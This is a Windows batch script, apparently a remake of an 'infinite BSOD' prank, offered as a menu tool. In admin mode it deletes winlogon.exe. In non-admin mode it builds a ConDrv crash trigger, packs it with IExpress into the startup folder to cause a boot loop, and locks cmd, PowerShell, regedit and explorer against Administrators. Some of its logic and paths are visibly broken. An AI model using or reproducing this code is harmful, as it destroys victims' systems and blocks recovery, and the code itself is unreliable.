::This script is a remake of just-infinite-bsod
::However, this extends functionality, using subroutines and ideas already present in the previous script

@echo off

::The default credits part, may be subject to change
:Credits_Reference
cls
echo ***********************************
echo *                                 *
echo *          DIRLOVE <3             *
echo *                                 *
echo ***********************************
echo.


::Default menu
:Menu
call :Credits_Reference
echo 1. BlueScreenOfDeath Trigger
echo 2. File locker
echo 3. Exit

set /p choice=Enter your choice:
if choice==1 goto BSOD_menu_option && goto Menu
if choice==2 goto FileLocker && goto Menu
if choice==3 exit
::File locker
:FileLocker
::This subroutine is essential similar to that of :LockProtect, however adding user interaction
echo.
call :Credits_Reference
set /p "lock_path=Enter the path to lock: "
if not exist %lock_path% (
    echo The path does not exist.
    pause
    goto FileLocker
)
call :LockProtect %lock_path%
echo The path to the file has been locked.
::BSOD menu
:BSOD_menu_option
cls
echo.
call :Credits_Reference
echo 1. Trigger BSOD (Administrators only)
echo 2. Trigger BSOD (Non-Administrators)
echo 3. Exit
set /p "choice=Enter your choice: "
if %choice%==1 goto BSOD_With_Admin
if %choice%==2 goto BSOD_NonAdmin
if %choice%==3 goto Menu

net session >nul 2>&1
if %errorLevel% neq 0 (
    call :BSOD_With_Admin
) else (
    call :PathBSOD
)
:BSOD_With_Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This is Administrators-only, which is not detected in this session. (Run this script as Administrators)
    pause
    goto Menu
)
else (
    takeown /f C:\Windows\System32\winlogon.exe
    icacls C:\Windows\System32\winlogon.exe /grant %username%:F
    del C:\Windows\System32\winlogon.exe
    shutdown /r /t 0
)

::Convert a batch file to an executable file
::Note that this step is essential, for the non-Admin BSOD trigger to work
:ConvertBatToExe
set "batfile=%~1"
set "batname=%~n1"
set "batpath=%~dp1"
set "exefile=%batpath%%batname%.exe"

:: Create an SED file for IExpress
set "sedfile=%batpath%%batname%.sed"

:: This is the options, required for creating the SED file
(
echo [Version]
echo Class=IEXPRESS
echo [Options]
echo PackagePurpose=InstallApp
echo ShowInstallProgramWindow=1
echo HideExtractAnimation=1
echo UseLongFileName=1
echo InsideCompressed=0
echo CAB_FixedSize=0
echo CAB_ResvCodeSigning=0
echo RebootMode=N
echo InstallPrompt=
echo DisplayLicense=
echo FinishMessage=
echo TargetName=%exefile%
echo FriendlyName=%batname%
echo AppLaunched=%batname%.bat
echo PostInstallCmd=<None>
echo AdminQuietInstCmd=
echo UserQuietInstCmd=
echo SourceFiles=SourceFiles
echo [SourceFiles]
echo SourceFiles0=%batpath%
echo [SourceFiles0]
echo %batname%.bat=
) > "%sedfile%"

:: Run IExpress to create the EXE
iexpress /N /Q "%sedfile%"

:: Clean up SED file
del "%sedfile%"

::This is the non-Admin BSOD trigger
:BSOD_NonAdmin
::Setup the BSOD cause
::More info in this video: https://www.youtube.com/watch?v=JjebNlzX6us
::Note that this method only works on Windows 10 only
set BSOD_Trigger_Path="\\.\GLOBALROOT\Device\ConDrv\KernelConnect"
echo %BSOD_Trigger_Path% > %~dp0\BSOD_Trigger_Path.bat
call :ConvertBatToExe %~dp0\BSOD_Trigger_Path.bat

::Copying the BSOD trigger to the startup folder
::Now the user is stuck in a bootloop
copy %~dp0\BSOD_Trigger_Path.exe %shell:startup%
call :SafeLock

::Directly shutting down the computer
shutdown /r /t 0


::This is for safety measures =)), ensuring that users cannot delete the file.
::Note that this is harmful, since any programs listed here is not usable, even for Administrators.
::The only user, which has the right to use these programs, is the default SYSTEM user.
:SafeLock
call :LockProtect "C:\Users\regedit.exe"
call :LockProtect "C:\Users\cmd.exe"
call :LockProtect "C:\Users\powershell.exe"
call :LockProtect "C:\Users\explorer.exe"
call :LockProtect %~dp0
::Get the unchanged username
:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)
::Lock a file/directory
:LockProtect

icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t

exit /b 0
